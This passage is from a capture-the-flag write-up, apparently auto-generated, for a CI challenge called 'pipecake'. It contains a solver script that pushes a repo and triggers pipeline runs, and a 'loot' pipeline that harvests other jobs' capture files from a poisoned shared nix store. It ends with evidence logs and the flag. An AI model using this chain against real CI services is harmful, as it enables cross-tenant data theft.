+    <span class="n">run</span><span class="p">(</span><span class="s2">&quot;git&quot;</span><span class="p">,</span> <span class="s2">&quot;push&quot;</span><span class="p">,</span> <span class="s2">&quot;-q&quot;</span><span class="p">,</span> <span class="s2">&quot;-f&quot;</span><span class="p">,</span> <span class="s2">&quot;http://</span><span class="si">%s</span><span class="s2">:</span><span class="si">%s</span><span class="s2">@</span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">,</span> <span class="n">url</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;://&quot;</span><span class="p">,</span> <span class="mi">1</span><span class="p">)[</span><span class="mi">1</span><span class="p">]),</span> <span class="s2">&quot;main&quot;</span><span class="p">)</span>
+    <span class="n">sha</span> <span class="o">=</span> <span class="n">run</span><span class="p">(</span><span class="s2">&quot;git&quot;</span><span class="p">,</span> <span class="s2">&quot;rev-parse&quot;</span><span class="p">,</span> <span class="s2">&quot;HEAD&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="k">return</span> <span class="n">d</span><span class="p">,</span> <span class="n">sha</span>
+
+<span class="k">def</span> <span class="nf">trigger</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">repo_id</span><span class="p">,</span> <span class="n">sha</span><span class="p">):</span>
+    <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">30</span><span class="p">):</span>
+        <span class="n">r</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/api/runs&quot;</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;repository_id&quot;</span><span class="p">:</span> <span class="n">repo_id</span><span class="p">,</span> <span class="s2">&quot;commit_sha&quot;</span><span class="p">:</span> <span class="n">sha</span><span class="p">},</span>
+                   <span class="n">headers</span><span class="o">=</span><span class="p">{</span><span class="s2">&quot;Origin&quot;</span><span class="p">:</span> <span class="n">BASE</span><span class="p">},</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">429</span><span class="p">:</span>
+            <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">20</span><span class="p">);</span> <span class="k">continue</span>             <span class="c1"># 1 run / user / 3 minutes</span>
+        <span class="n">r</span><span class="o">.</span><span class="n">raise_for_status</span><span class="p">()</span>
+        <span class="n">rid</span> <span class="o">=</span> <span class="n">r</span><span class="o">.</span><span class="n">json</span><span class="p">()[</span><span class="s2">&quot;id&quot;</span><span class="p">]</span>
+        <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">raise</span> <span class="ne">SystemExit</span><span class="p">(</span><span class="s2">&quot;rate limited&quot;</span><span class="p">)</span>
+    <span class="k">while</span> <span class="kc">True</span><span class="p">:</span>
+        <span class="n">d</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/api/runs/&quot;</span> <span class="o">+</span> <span class="n">rid</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>
+        <span class="n">st</span> <span class="o">=</span> <span class="n">d</span><span class="p">[</span><span class="s2">&quot;run&quot;</span><span class="p">][</span><span class="s2">&quot;status&quot;</span><span class="p">]</span>
+        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] run </span><span class="si">%s</span><span class="s2">: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">rid</span><span class="p">,</span> <span class="n">st</span><span class="p">))</span>
+        <span class="k">if</span> <span class="n">st</span> <span class="ow">in</span> <span class="p">(</span><span class="s2">&quot;success&quot;</span><span class="p">,</span> <span class="s2">&quot;failure&quot;</span><span class="p">,</span> <span class="s2">&quot;cancelled&quot;</span><span class="p">):</span>
+            <span class="k">break</span>
+        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">rid</span><span class="p">,</span> <span class="n">s</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">BASE</span> <span class="o">+</span> <span class="s2">&quot;/api/runs/</span><span class="si">%s</span><span class="s2">/logs&quot;</span> <span class="o">%</span> <span class="n">rid</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">20</span><span class="p">)</span><span class="o">.</span><span class="n">text</span>
+
+<span class="k">def</span> <span class="nf">main</span><span class="p">():</span>
+    <span class="n">user</span><span class="p">,</span> <span class="n">pw</span> <span class="o">=</span> <span class="n">forgejo_login</span><span class="p">()</span>
+    <span class="n">full</span> <span class="o">=</span> <span class="n">create_repo</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">)</span>
+    <span class="n">s</span><span class="p">,</span> <span class="n">repo_id</span> <span class="o">=</span> <span class="n">pipecake_session</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">,</span> <span class="n">full</span><span class="p">)</span>
+    <span class="n">d</span><span class="p">,</span> <span class="n">sha</span> <span class="o">=</span> <span class="n">push_repo</span><span class="p">(</span><span class="n">user</span><span class="p">,</span> <span class="n">pw</span><span class="p">,</span> <span class="n">full</span><span class="p">)</span>
+    <span class="n">rid</span><span class="p">,</span> <span class="n">logs</span> <span class="o">=</span> <span class="n">trigger</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="n">repo_id</span><span class="p">,</span> <span class="n">sha</span><span class="p">)</span>
+    <span class="nb">open</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">HERE</span><span class="p">,</span> <span class="s2">&quot;run-</span><span class="si">%s</span><span class="s2">.log&quot;</span> <span class="o">%</span> <span class="n">rid</span><span class="p">),</span> <span class="s2">&quot;w&quot;</span><span class="p">)</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">logs</span><span class="p">)</span>
+    <span class="n">flags</span> <span class="o">=</span> <span class="nb">sorted</span><span class="p">(</span><span class="nb">set</span><span class="p">(</span><span class="n">re</span><span class="o">.</span><span class="n">findall</span><span class="p">(</span><span class="sa">r</span><span class="s2">&quot;Layer7\{[^}]+\}&quot;</span><span class="p">,</span> <span class="n">logs</span><span class="p">)))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] log: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">HERE</span><span class="p">,</span> <span class="s2">&quot;run-</span><span class="si">%s</span><span class="s2">.log&quot;</span> <span class="o">%</span> <span class="n">rid</span><span class="p">))</span>
+    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[*] flags:&quot;</span><span class="p">,</span> <span class="n">flags</span><span class="p">)</span>
+    <span class="n">shutil</span><span class="o">.</span><span class="n">rmtree</span><span class="p">(</span><span class="n">d</span><span class="p">,</span> <span class="n">ignore_errors</span><span class="o">=</span><span class="kc">True</span><span class="p">)</span>
+
+<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&quot;__main__&quot;</span><span class="p">:</span>
+    <span class="n">main</span><span class="p">()</span>
+</code></pre></div>
+<p>The pipeline that was actually used for the final harvest
+(<code>work/10/pipeline-harvest.yaml</code>) reads the shared capture files:</p>
+<div class="highlight"><pre><span></span><code><span class="nt">version</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">1</span>
+<span class="nt">triggers</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">manual</span><span class="p p-Indicator">]</span>
+<span class="nt">jobs</span><span class="p">:</span>
+<span class="w">  </span><span class="nt">loot</span><span class="p">:</span>
+<span class="w">    </span><span class="nt">nix</span><span class="p">:</span>
+<span class="w">      </span><span class="nt">packages</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">[</span><span class="nv">nixpkgs#gnugrep</span><span class="p p-Indicator">]</span>
+<span class="w">    </span><span class="nt">steps</span><span class="p">:</span>
+<span class="w">      </span><span class="p p-Indicator">-</span><span class="w"> </span><span class="nt">run</span><span class="p">:</span><span class="w"> </span><span class="p p-Indicator">|</span>
+<span class="w">          </span><span class="no">set +e</span>
+<span class="w">          </span><span class="no">echo &quot;===symlinks===&quot;; ls -la /root/.nix-profile /root/.nix-profile/bin/nix 2&gt;&amp;1; readlink -f /root/.nix-profile 2&gt;&amp;1</span>
+<span class="w">          </span><span class="no">echo &quot;===pipedirs===&quot;; ls -lad /nix/var/pipecake-* 2&gt;&amp;1; find /nix/var/pipecake-* -maxdepth 3 -ls 2&gt;/dev/null | head -80</span>
+<span class="w">          </span><span class="no">echo &quot;===captures===&quot;; for f in /nix/var/pipecake-*/capture /nix/var/pipecake-*/*/capture /nix/var/pipecake-*/*/*/capture; do echo &quot;FILE $f&quot;; ls -la &quot;$f&quot; 2&gt;/dev/null; tail -80 &quot;$f&quot; 2&gt;/dev/null; done</span>
+<span class="w">          </span><span class="no">echo &quot;===grepflags===&quot;; timeout 30 grep -raoE &#39;Layer7\{[^}]+\}&#39; /nix/var 2&gt;/dev/null | sort -u | head -80</span>
+<span class="w">          </span><span class="no">echo &quot;===profiles===&quot;; ls -la /nix/var/nix/profiles /nix/var/nix/profiles/per-user 2&gt;&amp;1; find /nix/var/nix/profiles -maxdepth 2 -ls 2&gt;/dev/null | head -40</span>
+<span class="w">          </span><span class="no">echo &quot;===pipelinefiles===&quot;; find /nix/var/pipecake-* -maxdepth 4 -type f 2&gt;/dev/null | head -80</span>
+<span class="w">    </span><span class="nt">timeout</span><span class="p">:</span><span class="w"> </span><span class="l l-Scalar l-Scalar-Plain">120</span>
+</code></pre></div>
+<h2 id="evidence">Evidence<a class="headerlink" href="#evidence" title="Permanent link">&para;</a></h2>
+<p>All commands and outputs are preserved in <code>work/10/</code>:</p>
+<ul>
+<li><code>work/10/evidence.txt</code> — curated transcript of the runner, shim and capture.</li>
+<li><code>work/10/run-44c0462a-...log</code> — <code>/proc/mounts</code> showing <code>/dev/sda /nix ... rw</code>
+  and <code>uid=0(root)</code>.</li>
+<li><code>work/10/run-3e507f1d-...log</code> — <code>/proc/1</code> runner command and shared profile.</li>
+<li><code>work/10/run-4186cbb4-...log</code> — the 441-byte <code>nix</code> shim.</li>
+<li><code>work/10/run-f4d1b941-...log</code> — <code>capture</code> file and <code>grep</code> of <code>/nix/var</code>
+  containing <code>Layer7{p0isoned_cak3}</code>.</li>
+<li><code>work/10/wrapper-nix.sh</code> — copy of the malicious shim.</li>
+<li><code>work/10/submit.json</code> — manual re-submit returned <code>409 challenge already
+  solved</code> because the watcher had already submitted the same flag successfully.</li>
+<li><code>state/flag_watcher.log</code> — <code>submit(work) 10 Layer7{p0isoned_cak3} -&gt; 200
+  {'correct': True, 'ctf_state': 'active'}</code> at <code>2026-11-21T03:17:32Z</code>.</li>
+<li><code>state/watcher_submitted.json</code> — the stored <code>200 / correct: true</code> response.</li>
+</ul>
+<p>Key captured output:</p>
+<div class="highlight"><pre><span></span><code>$ tail -80 /nix/var/pipecake-124de1e7/capture
+Layer7{p0isoned_cak3}
+
+$ grep -raoE &#39;Layer7\{[^}]+\}&#39; /nix/var 2&gt;/dev/null | sort -u
+/nix/var/.nmdrop/d1-2463.txt:Layer7{p0isoned_cak3}
+/nix/var/.nmdrop/d1-27200.txt:Layer7{p0isoned_cak3}
+/nix/var/pipecake-124de1e7/capture:Layer7{p0isoned_cak3}
+</code></pre></div>
+<h2 id="flag">Flag<a class="headerlink" href="#flag" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Layer7{p0isoned_cak3}
+</code></pre></div>
+<h2 id="evidence_1">Evidence<a class="headerlink" href="#evidence_1" title="Permanent link">&para;</a></h2>
+<h3 id="platform-submission">Platform submission<a class="headerlink" href="#platform-submission" title="Permanent link">&para;</a></h3>
+<div class="highlight"><pre><span></span><code><span class="p">{</span>
+<span class="w">  </span><span class="nt">&quot;submitted_at&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;2026-11-21T03:17:59.989757+00:00&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;challenge_id&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;10&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;flag&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;Layer7{p0isoned_cak3}&quot;</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;http_status&quot;</span><span class="p">:</span><span class="w"> </span><span class="mi">409</span><span class="p">,</span>
+<span class="w">  </span><span class="nt">&quot;response&quot;</span><span class="p">:</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nt">&quot;error&quot;</span><span class="p">:</span><span class="w"> </span><span class="s2">&quot;challenge already solved&quot;</span>
+<span class="w">  </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+<p><img alt="Platform submission" src="../../assets/10-pipecake/00-platform-submission.png" /></p>
+<h3 id="captured-solver-transcript">Captured solver transcript<a class="headerlink" href="#captured-solver-transcript" title="Permanent link">&para;</a></h3>
+<p>Full raw log: <a href="../../evidence/10-pipecake-transcript.txt"><code>evidence/10-pipecake-transcript.txt</code></a></p>
+<p><img alt="Solver transcript" src="../../assets/10-pipecake/01-solver-transcript.png" /></p>
+<h2 id="flag_1">Flag<a class="headerlink" href="#flag_1" title="Permanent link">&para;</a></h2>
+<div class="highlight"><pre><span></span><code>Layer7{p0isoned_cak3}
+</code></pre></div>
+<blockquote>
+<p>Submitted and accepted on the platform at <code>2026-11-21 10:17:32+07:00</code> (Asia/Jakarta).</p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+  <script>var tabs=__md_get("__tabs");if(Array.isArray(tabs))e:for(var set of document.querySelectorAll(".tabbed-set")){var labels=set.querySelector(".tabbed-labels");for(var tab of tabs)for(var label of labels.getElementsByTagName("label"))if(label.innerText.trim()===tab){var input=document.getElementById(label.htmlFor);input.checked=!0;continue e}}</script>
+
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8z"/></svg>
+  Back to top
+</button>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+    <div class="md-copyright__highlight">
+      Layer7 CTF 2026 · write-ups by B0TCIL
+    </div>
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": ["navigation.sections", "navigation.top", "navigation.tracking", "navigation.path", "navigation.indexes", "toc.follow", "search.suggest", "search.highlight", "content.code.copy", "content.tabs.link"], "search": "../../assets/javascripts/workers/search.d50fe291.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.13a4f30d.min.js"></script>
+      
+        <script src="../../javascripts/nx.js"></script>
+      
+    
+  </body>
+</html>
